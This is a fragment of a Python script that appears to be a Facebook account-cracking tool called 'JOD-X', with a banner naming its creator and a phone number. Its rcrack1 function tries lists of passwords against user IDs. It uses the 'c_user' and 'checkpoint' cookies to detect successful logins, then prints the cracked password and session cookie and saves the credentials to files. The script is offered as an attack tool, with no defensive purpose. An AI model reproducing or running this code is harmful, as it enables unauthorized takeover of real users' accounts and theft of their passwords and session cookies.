...
logo= ("""
 ...
 | |_| | |_| | |_| |_____/  \ 
  \___/ \___/|____/     /_/\_\                        
\033[1;91m--------------------------------------------
\033[1;91m[✓] CREATOR   > ANIK MACKFILD 
\033[1;91m[✓] FACEBOOK  > Anik Mackfild 
\033[1;91m[✓] GITHUB    > PORA DIBO NAY 😪
\033[1;91m[✓] VERSION   > PRIVATE 
\033[1;91m[✓] WHATSAPP  > +8801617350448
\033[1;91m--------------------------------------------""")
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;31m[%sJOD-X \033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'upgrade-insecure-requests': '1',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f"\033[38;5;46m[JOD-X -OK] {uid} • {ps}" '  \n\033[1;33m [💉]\033[1;33mCookie = \033[1;32m'+coki+  ' \n\033[1;33m [🍎] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
                open('/sdcard/JOD-X -OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[JOD-X -CP] {uid} • {ps}")
                open('/sdcard/JOD-X -CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
